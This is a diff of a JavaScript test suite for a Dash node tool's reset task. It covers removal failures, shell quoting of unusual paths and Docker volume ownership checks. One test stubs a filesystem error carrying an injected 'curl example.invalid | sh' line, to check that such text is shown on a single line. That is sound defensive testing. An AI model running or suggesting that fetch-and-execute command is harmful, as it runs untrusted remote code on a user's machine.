@@ -64,6 +64,33 @@ describe('resetNodeTaskFactory', () => {
     return filePath;
   }
 
+  /**
+   * @param {string} code
+   * @param {string} message
+   * @return {Error} an error as Node's filesystem calls throw it
+   */
+  function fsError(code, message) {
+    return Object.assign(new Error(message), { code });
+  }
+
+  /**
+   * Make Node's recursive removal of a path fail, the files left in place
+   *
+   * @param {sinon.SinonSandbox} sinon
+   * @param {string} targetPath
+   * @param {Error} error
+   */
+  function failRemoval(sinon, targetPath, error) {
+    const { rmSync } = fs;
+    sinon.stub(fs, 'rmSync').callsFake((removedPath, ...args) => {
+      if (removedPath === targetPath) {
+        throw error;
+      }
+
+      return rmSync.call(fs, removedPath, ...args);
+    });
+  }
+
   beforeEach(function beforeEach() {
     homeDir = HomeDir.createTemp();
 
@@ -76,7 +103,8 @@ describe('resetNodeTaskFactory', () => {
       isNodeRunning: this.sinon.stub().resolves(false),
       down: this.sinon.stub().resolves(),
       rm: this.sinon.stub().resolves(),
-      getVolumeNames: this.sinon.stub().resolves([]),
+      getVolumeCandidates: this.sinon.stub().resolves([]),
+      isVolumeOwned: this.sinon.stub().resolves(true),
     };
 
     // A testnet Evo fullnode: it runs platform, but no identity is registered
@@ -221,7 +249,7 @@ describe('resetNodeTaskFactory', () => {
       expect(dockerCompose.isNodeRunning).to.not.have.been.called();
       expect(dockerCompose.rm).to.not.have.been.called();
       expect(dockerCompose.down).to.not.have.been.called();
-      expect(dockerCompose.getVolumeNames).to.not.have.been.called();
+      expect(dockerCompose.getVolumeCandidates).to.not.have.been.called();
       expect(configFile.isConfigExists('devnet-ops')).to.be.true();
       expect(fs.existsSync(corePath)).to.be.true();
       expect(fs.existsSync(platformPath)).to.be.true();
@@ -352,17 +380,7 @@ describe('resetNodeTaskFactory', () => {
 
     // The members before it were already reset, and their files are gone.
     it('should say to render the other members too when removal fails', async function test() {
-      const filePath = homeDir.joinPath('local_1', 'platform', 'drive', 'tenderdash', 'config.toml');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((removedPath) => {
-        if (removedPath === filePath) {
-          const error = new Error(`EIO: i/o error, unlink '${removedPath}'`);
-          error.code = 'EIO';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, removedPath);
-      });
+      failRemoval(this.sinon, homeDir.joinPath('local_1', 'platform'), fsError('EIO', 'EIO: i/o error, rm'));
 
       await expect(hardReset({ isPlatformOnlyReset: true }))
         .to.be.rejectedWith("every config of group 'local'");
@@ -402,6 +420,28 @@ describe('resetNodeTaskFactory', () => {
      */
     function lockDirectory(...segments) {
       return lockDirectoryWithMode(0o555, ...segments);
+    }
+
+    /**
+     * Make a directory read-only once the reset's check has passed, just as
+     * Node's recursive removal of the Platform directory starts
+     *
+     * @param {sinon.SinonSandbox} sinon
+     * @param {...string} segments
+     * @return {string}
+     */
+    function lockDirectoryOnRemoval(sinon, ...segments) {
+      const targetPath = homeDir.joinPath('testnet', 'platform');
+      const { rmSync } = fs;
+      sinon.stub(fs, 'rmSync').callsFake((removedPath, ...args) => {
+        if (removedPath === targetPath) {
+          lockDirectory(...segments);
+        }
+
+        return rmSync.call(fs, removedPath, ...args);
+      });
+
+      return homeDir.joinPath(...segments);
     }
 
     /**
@@ -551,10 +591,12 @@ describe('resetNodeTaskFactory', () => {
     /**
      * Move the test to a home directory whose path a shell must be given
      * quoted, with the same files as the one it replaces
+     *
+     * @param {string} [prefix] - the start of the directory's name
      */
-    function useHomeDirWithApostrophe() {
+    function useHomeDirWithApostrophe(prefix = "dashmate-o'brien-") {
       homeDir.remove();
-      homeDir = new HomeDir(fs.mkdtempSync(path.join(os.tmpdir(), "dashmate-o'brien-")));
+      homeDir = new HomeDir(fs.mkdtempSync(path.join(os.tmpdir(), prefix)));
 
       useConfigs([config]);
 
@@ -602,23 +644,58 @@ describe('resetNodeTaskFactory', () => {
     });
 
     it('should quote the path in the removal it advises once removal has begun', async function test() {
+      skipAsRoot(this);
       useHomeDirWithApostrophe();
 
-      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
+      lockDirectoryOnRemoval(this.sinon, 'testnet', 'platform', 'gateway', 'ssl');
       const platformPath = homeDir.joinPath('testnet', 'platform');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
-        if (filePath === keyPath) {
-          const error = new Error(`EPERM: operation not permitted, unlink '${filePath}'`);
-          error.code = 'EPERM';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, filePath);
-      });
 
       await expect(hardReset({ isPlatformOnlyReset: true }))
         .to.be.rejectedWith(`  sudo rm -rf '${platformPath.split("'").join("'\\''")}'\n`);
+    });
+
+    // Plain single quotes keep a line break, which splits the command, and
+    // dash, Debian's and Ubuntu's /bin/sh, reads dollar-single quotes as a
+    // dollar sign and a quoted string: a printed command would act on another
+    // path. Such a path gets no command to paste, only the commands to run on
+    // it and the path escaped, for reading.
+    it('should give no command to paste for a path holding a control character', async function test() {
+      skipAsRoot(this);
+      useHomeDirWithApostrophe('dashmate-line\nbreak-');
+
+      lockDirectory('testnet', 'platform', 'gateway', 'ssl');
+      const platformPath = homeDir.joinPath('testnet', 'platform');
+
+      const error = await hardReset({ isPlatformOnlyReset: true }).then(
+        () => { throw new Error('the reset succeeded'); },
+        (e) => e,
+      );
+
+      const lines = error.message.split('\n');
+
+      expect(lines.filter((line) => /^\s*(sudo|chmod|chown)\b/.test(line))).to.be.empty();
+      const { uid, gid } = os.userInfo();
+      expect(lines).to.include(`  'sudo chown -R ${uid}:${gid}' and then 'chmod -R u+rwX' on the path below.`);
+      expect(lines).to.include(`  '${platformPath.replace('\n', '\\n')}'`);
+    });
+
+    it('should give no removal to paste for a path holding a control character', async function test() {
+      skipAsRoot(this);
+      useHomeDirWithApostrophe('dashmate-line\nbreak-');
+
+      lockDirectoryOnRemoval(this.sinon, 'testnet', 'platform', 'gateway', 'ssl');
+      const platformPath = homeDir.joinPath('testnet', 'platform');
+
+      const error = await hardReset({ isPlatformOnlyReset: true }).then(
+        () => { throw new Error('the reset succeeded'); },
+        (e) => e,
+      );
+
+      const lines = error.message.split('\n');
+
+      expect(lines.filter((line) => /^\s*sudo\b/.test(line))).to.be.empty();
+      expect(lines).to.include("  'sudo rm -rf' on the path below.");
+      expect(lines).to.include(`  '${platformPath.replace('\n', '\\n')}'`);
     });
 
     // A file name can hold a line break or a terminal control sequence. Shown
@@ -645,17 +722,11 @@ describe('resetNodeTaskFactory', () => {
     });
 
     it('should show a filesystem error on one line', async function test() {
-      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
-        if (filePath === keyPath) {
-          const error = new Error('EIO: i/o error\nRun: curl example.invalid | sh');
-          error.code = 'EIO';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, filePath);
-      });
+      failRemoval(
+        this.sinon,
+        homeDir.joinPath('testnet', 'platform'),
+        fsError('EIO', 'EIO: i/o error\nRun: curl example.invalid | sh'),
+      );
 
       const error = await hardReset({ isPlatformOnlyReset: true }).then(
         () => { throw new Error('the reset succeeded'); },
@@ -703,78 +774,76 @@ describe('resetNodeTaskFactory', () => {
     });
 
     // A directory that becomes read-only between the check and the removal
-    // keeps its entries; the rest is still removed and the path named.
-    it('should go on past a directory that turns read-only during removal', async function test() {
-      const sslPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl');
-      const { accessSync } = fs;
-      let sslChecks = 0;
-      this.sinon.stub(fs, 'accessSync').callsFake((checkedPath, mode) => {
-        if (checkedPath === sslPath) {
-          sslChecks += 1;
+    // makes Node's recursive removal fail, naming the target at most. The
+    // reset does not go on past the failure: it names each path left that this
+    // user cannot remove, and how to recover.
+    it('should name what is left that it cannot remove once removal has failed', async function test() {
+      skipAsRoot(this);
 
-          if (sslChecks > 1) {
-            const error = new Error(`EACCES: permission denied, access '${checkedPath}'`);
-            error.code = 'EACCES';
-            throw error;
-          }
-        }
-
-        return accessSync.call(fs, checkedPath, mode);
-      });
+      const sslPath = lockDirectoryOnRemoval(this.sinon, 'testnet', 'platform', 'gateway', 'ssl');
+      const platformPath = homeDir.joinPath('testnet', 'platform');
 
       const error = await hardReset({ isPlatformOnlyReset: true }).then(
         () => { throw new Error('the reset succeeded'); },
         (e) => e,
       );
 
-      expect(error.message).to.include(`'${sslPath}'`);
+      expect(fs.rmSync.withArgs(platformPath)).to.have.been.calledOnce();
+      expect(error.message).to.include('for lack of permission');
+      expect(error.message.split('\n')).to.include(`  '${sslPath}'`);
       expect(error.message).to.include('dashmate config render --config testnet');
-      expect(fs.existsSync(homeDir.joinPath('testnet', 'platform', 'drive'))).to.be.false();
-      expect(fs.existsSync(homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'bundle.crt'))).to.be.true();
+      expect(fs.existsSync(path.join(sslPath, 'bundle.crt'))).to.be.true();
     });
 
     // Other failures during removal leave the same half-removed files behind.
     it('should give the same recovery for any other failure during removal', async function test() {
-      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
-        if (filePath === keyPath) {
-          const error = new Error(`EIO: i/o error, unlink '${filePath}'`);
-          error.code = 'EIO';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, filePath);
-      });
-
-      await expect(hardReset({ isPlatformOnlyReset: true }))
-        .to.be.rejectedWith(/EIO: i\/o error[\s\S]*dashmate config render --config testnet/);
-    });
-
-    // What the check cannot foresee, such as a file in a sticky directory or
-    // one marked immutable, fails once removal has begun. Compose then needs
-    // the service files rendered again before the reset can run.
-    it('should name what it could not remove once removal has begun', async function test() {
-      const keyPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl', 'private.key');
-      const { unlinkSync } = fs;
-      this.sinon.stub(fs, 'unlinkSync').callsFake((filePath) => {
-        if (filePath === keyPath) {
-          const error = new Error(`EPERM: operation not permitted, unlink '${filePath}'`);
-          error.code = 'EPERM';
-          throw error;
-        }
-
-        return unlinkSync.call(fs, filePath);
-      });
+      failRemoval(this.sinon, homeDir.joinPath('testnet', 'platform'), fsError('EIO', 'EIO: i/o error, rm'));
 
       const error = await hardReset({ isPlatformOnlyReset: true }).then(
         () => { throw new Error('the reset succeeded'); },
         (e) => e,
       );
 
-      expect(error.message).to.include(`'${keyPath}'`);
+      expect(error.message).to.match(/EIO: i\/o error[\s\S]*dashmate config render --config testnet/);
+      expect(error.message.split('\n').filter((line) => /^\s*sudo\b/.test(line))).to.be.empty();
+    });
+
+    // What the check cannot foresee, such as a file in a sticky directory or
+    // one marked immutable, fails once removal has begun, and permissions do
+    // not show it. Node's error is shown with a removal that has the rights,
+    // and Compose then needs the service files rendered again before the
+    // reset can run.
+    it('should show the removal\'s error for a failure the check cannot foresee', async function test() {
+      failRemoval(
+        this.sinon,
+        homeDir.joinPath('testnet', 'platform'),
+        fsError('EPERM', 'EPERM: operation not permitted, rm'),
+      );
+
+      const error = await hardReset({ isPlatformOnlyReset: true }).then(
+        () => { throw new Error('the reset succeeded'); },
+        (e) => e,
+      );
+
+      expect(error.message).to.include('EPERM: operation not permitted, rm');
+      expect(error.message.split('\n'))
+        .to.include(`  sudo rm -rf ${quoteShellArgument(homeDir.joinPath('testnet', 'platform'))}`);
       expect(error.message).to.include('dashmate config render --config testnet');
       expect(dockerCompose.rm).to.have.been.calledOnce();
+    });
+
+    // Node's recursive removal is what the reset used before it could report
+    // each path, and it still removes the files. The walk only checks and
+    // reports.
+    it('should remove the files with Node\'s recursive removal', async function test() {
+      this.sinon.spy(fs, 'rmSync');
+      const platformPath = homeDir.joinPath('testnet', 'platform');
+
+      await hardReset({ isPlatformOnlyReset: true });
+
+      expect(fs.rmSync).to.have.been.calledWith(platformPath, { recursive: true, force: true });
+      expect(fs.existsSync(platformPath)).to.be.false();
+      expect(fs.existsSync(homeDir.joinPath('testnet', 'core', 'dash.conf'))).to.be.true();
     });
   });
 
@@ -814,7 +883,7 @@ describe('resetNodeTaskFactory', () => {
       await reset({ isPlatformOnlyReset: true, keepData: false });
 
       expect(dockerCompose.rm).to.have.been.calledOnce();
-      expect(dockerCompose.getVolumeNames).to.have.been.calledOnce();
+      expect(dockerCompose.getVolumeCandidates).to.have.been.calledOnce();
       expect(config.get('platform')).to.deep.equal(platformOptions);
       expect(fs.existsSync(homeDir.joinPath('mainnet', 'platform', 'gateway', 'ssl', 'private.key'))).to.be.true();
     });
@@ -857,6 +926,9 @@ describe('resetNodeTaskFactory', () => {
     let runningContainers;
     let configFailure;
     let configFailureConfigName;
+    let volumeDefinitionsByConfig;
+    let volumeInspectErrors;
+    let onRemoveServices;
     let platformConfig;
     let projectName;
     let diContainer;
@@ -889,6 +961,10 @@ describe('resetNodeTaskFactory', () => {
     function dockerVolume(name, remove) {
       return {
         inspect: async () => {
+          if (volumeInspectErrors[name]) {
+            throw volumeInspectErrors[name];
+          }
+
           if (!dockerVolumeLabels[name]) {
             throw Object.assign(new Error(`no such volume: ${name}`), { statusCode: 404 });
           }
@@ -918,6 +994,9 @@ describe('resetNodeTaskFactory', () => {
       runningContainers = [];
       configFailure = null;
       configFailureConfigName = null;
+      volumeDefinitionsByConfig = {};
+      volumeInspectErrors = {};
+      onRemoveServices = () => {};
       diContainer.register({
         docker: asValue({
           getVolume: (name) => dockerVolume(name, async () => {
@@ -972,16 +1051,25 @@ describe('resetNodeTaskFactory', () => {
         }
 
         if (command === 'config') {
+          // Given no names, Compose describes every service of the model.
+          const serviceNames = args.length > 0
+            ? [...args, ...(args.includes('quorum_list') ? ['core'] : [])]
+            : [...PLATFORM_SERVICES, 'core', 'dashmate_helper', ...Object.keys(serviceVolumes)];
           const services = Object.fromEntries(
-            [...args, ...(args.includes('quorum_list') ? ['core'] : [])]
-              .map((name) => [name, { volumes: serviceVolumes[name] }]),
+            serviceNames.map((name) => [name, { volumes: serviceVolumes[name] }]),
           );
+
+          const volumes = volumeDefinitionsByConfig[options.env?.CONFIG_NAME] ?? volumeDefinitions;
 
           return {
             exitCode: 0,
             err: '',
-            out: JSON.stringify({ name: projectName, services, volumes: volumeDefinitions }),
+            out: JSON.stringify({ name: projectName, services, volumes }),
           };
+        }
+
+        if (command === 'rm') {
+          onRemoveServices(options.env?.CONFIG_NAME);
         }
 
         return { exitCode: 0, err: '', out: '' };
@@ -1121,6 +1209,46 @@ describe('resetNodeTaskFactory', () => {
       ]);
     });
 
+    // An override can give a Platform service a volume Core mounts too, or an
+    // external key for a volume a Platform key also names. Docker knows the
+    // volume by its name, and it is Platform data only when Platform alone
+    // uses it and nothing declares it external.
+    it('should keep a volume Core mounts too, or one any key declares external', async () => {
+      serviceVolumes.core = [
+        ...serviceVolumes.core,
+        { type: 'volume', source: 'core_shared', target: '/shared' },
+      ];
+      serviceVolumes.gateway = [
+        { type: 'volume', source: 'core_data', target: '/core' },
+        { type: 'volume', source: 'gateway_shared', target: '/shared' },
+        { type: 'volume', source: 'gateway_managed', target: '/managed' },
+      ];
+      createProjectVolumes();
+      volumeDefinitions.gateway_shared = { name: 'docker_core_shared' };
+      volumeDefinitions.gateway_managed = { name: 'docker_drive_abci_data', external: true };
+      // Created for the Platform key, as when Compose started the gateway first
+      dockerVolumeLabels.docker_core_shared['com.docker.compose.volume'] = 'gateway_shared';
+
+      await platformReset();
+
+      expect(removedVolumes).to.have.members([
+        'docker_drive_tenderdash',
+        'docker_rs-dapi-access-logs',
+      ]);
+    });
+
+    // The helper is removed with the Platform services, so a volume it shares
+    // with them has no service left to use it.
+    it('should remove a Platform volume the helper mounts too', async () => {
+      serviceVolumes.dashmate_helper = [
+        { type: 'volume', source: 'drive_abci_data', target: '/drive' },
+      ];
+
+      await platformReset();
+
+      expect(removedVolumes).to.include('docker_drive_abci_data');
+    });
+
     // Compose cannot describe the project while service files it needs are
     // missing. Finding that out after the removal would leave the containers
     // gone and the volumes in place.
@@ -1193,6 +1321,131 @@ describe('resetNodeTaskFactory', () => {
       expect(callsFor('rm')).to.deep.equal(['node_1', 'node_2']);
       expect(composeCalls.findIndex(({ command }) => command === 'rm'))
         .to.be.above(composeCalls.map(({ command }) => command).lastIndexOf('config'));
+    });
+
+    // A group reset plans every member before it resets any, and while the
+    // members before it are reset a later member's volume can be replaced by
+    // one Platform does not own, or created by a start. Whose a volume is
+    // counts when it is removed, not when the reset was planned.
+    it('should decide whose a member\'s volume is when it removes it', async () => {
+      const members = ['node_1', 'node_2'].map((name) => {
+        const options = platformConfig.getStoredOptions();
+        options.group = 'testnet';
+
+        return new Config(name, options);
+      });
+
+      volumeDefinitionsByConfig.node_2 = Object.fromEntries(Object.keys(volumeDefinitions)
+        .map((key) => [key, { name: `node_2_${key}` }]));
+      Object.keys(volumeDefinitions).forEach((key) => {
+        dockerVolumeLabels[`node_2_${key}`] = {
+          'com.docker.compose.project': projectName,
+          'com.docker.compose.volume': key,
+        };
+      });
+      delete dockerVolumeLabels.node_2_drive_tenderdash;
+
+      onRemoveServices = (configName) => {
+        if (configName !== 'node_1') {
+          return;
+        }
+
+        dockerVolumeLabels.node_2_drive_abci_data = {
+          'com.docker.compose.project': 'other_project',
+          'com.docker.compose.volume': 'drive_abci_data',
+        };
+        dockerVolumeLabels.node_2_drive_tenderdash = {
+          'com.docker.compose.project': projectName,
+          'com.docker.compose.volume': 'drive_tenderdash',
+        };
+      };
+
+      await GroupResetCommand.prototype.runWithDependencies.call(
+        {},
+        {},
+        {
+          verbose: false, hard: false, force: true, platform: true,
+        },
+        diContainer.resolve('resetNodeTask'),
+        members,
+        () => new Listr([]),
+        () => new Listr([]),
+      );
+
+      expect(removedVolumes.filter((name) => name.startsWith('node_2_'))).to.have.members([
+        'node_2_drive_tenderdash',
+        'node_2_rs-dapi-access-logs',
+      ]);
+    });
+
+    // Whose a volume is counts when it is removed, but a Docker that cannot
+    // answer for a later member's volume must stop the group before the
+    // members before it lose their services and files.
+    it('should ask Docker about every member\'s volumes before it removes anything', async () => {
+      const members = ['node_1', 'node_2'].map((name) => {
+        const options = platformConfig.getStoredOptions();
+        options.group = 'testnet';
+
+        return new Config(name, options);
+      });
+
+      volumeDefinitionsByConfig.node_2 = { drive_abci_data: { name: 'node_2_drive_abci_data' } };
+      volumeInspectErrors.node_2_drive_abci_data = Object.assign(new Error('Docker volume inspect failed'), { statusCode: 500 });
+
+      const error = await GroupResetCommand.prototype.runWithDependencies.call(
+        {},
+        {},
+        {
+          verbose: false, hard: false, force: true, platform: true,
+        },
+        diContainer.resolve('resetNodeTask'),
+        members,
+        () => new Listr([]),
+        () => new Listr([]),
+      ).then(() => null, (e) => e);
+
+      expect(error.getError().message).to.include('Docker volume inspect failed');
+      expect(composeCalls.filter(({ command }) => command === 'rm')).to.be.empty();
+      expect(removedVolumes).to.be.empty();
+    });
+
+    // While the reset waits for a volume in use, it can be removed and
+    // replaced under the same name by a volume Platform does not own.
+    it('should ask whose a volume is again before each attempt to remove it', async () => {
+      let attempts = 0;
+      diContainer.register({
+        docker: asValue({
+          getVolume: (name) => dockerVolume(name, async () => {
+            if (name === 'docker_drive_abci_data') {
+              attempts += 1;
+
+              if (attempts === 1) {
+                // eslint-disable-next-line no-throw-literal
+                throw { statusCode: 409 };
+              }
+            }
+
+            removedVolumes.push(name);
+          }),
+        }),
+      });
+
+      let removals = 0;
+      onRemoveServices = () => {
+        removals += 1;
+
+        if (removals === 2) {
+          dockerVolumeLabels.docker_drive_abci_data = {
+            'com.docker.compose.project': 'other_project',
+            'com.docker.compose.volume': 'drive_abci_data',
+          };
+        }
+      };
+
+      await platformReset();
+
+      expect(removals).to.equal(2);
+      expect(removedVolumes).to.not.include('docker_drive_abci_data');
     });
 
     it('should remove the Platform services again the same way while a volume is in use', async () => {
